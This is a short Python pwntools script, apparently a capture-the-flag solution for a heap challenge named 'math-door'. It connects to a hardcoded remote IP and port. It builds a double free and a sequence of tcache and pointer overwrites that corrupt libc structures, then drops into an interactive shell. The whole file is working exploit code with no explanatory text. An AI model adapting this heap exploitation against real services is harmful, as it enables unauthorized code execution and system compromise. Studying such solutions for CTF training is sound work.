#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
exe = ELF('math-door_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
    gdb.attach(r, gdbscript='''
        b*main+48
        c
        c 40
    ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)

if args.REMOTE:
    r = remote('165.232.98.69', 32112)
else:
    r = process(exe.path)
    GDB()

def choice(choice, id = 0, note = b'/bin/sh'):
    sla(b'Action: \n', str(choice).encode())
    if choice != 1:
        sla(b'index:\n', str(id).encode())
    if choice == 3:
        sa(b'hieroglyph:\n', note)
        
def double_free(id):
    choice(2, id)
    choice(3, id, b'\x00'*8 + b'\x01')
    choice(2, id)


for i in range(40):
    choice(1)

double_free(0)
choice(3, 0, p64(0x18))
choice(1)
choice(1)
choice(3, 41, p64(0x420))

choice(2, 1)

choice(2, 3)
choice(2, 4)
choice(2, 0)
choice(2, 5)

choice(3, 5, p64(0x20))
choice(3, 1, p64(0x2a20))
for i in range(3):
    choice(1)
    
choice(2, 7)
choice(3, 7, p64(-256, sign=True))
choice(1)
choice(1)
choice(3, 46, p64(0xbfa7e))

choice(2, 10)
choice(2, 6)
choice(2, 11)
choice(3, 7, p64(-0x20, sign=True))

choice(3, 11, p64(0x20))
for i in range(3):
    choice(1)

choice(3, 49, p64(-702, sign=True))

r.interactive()
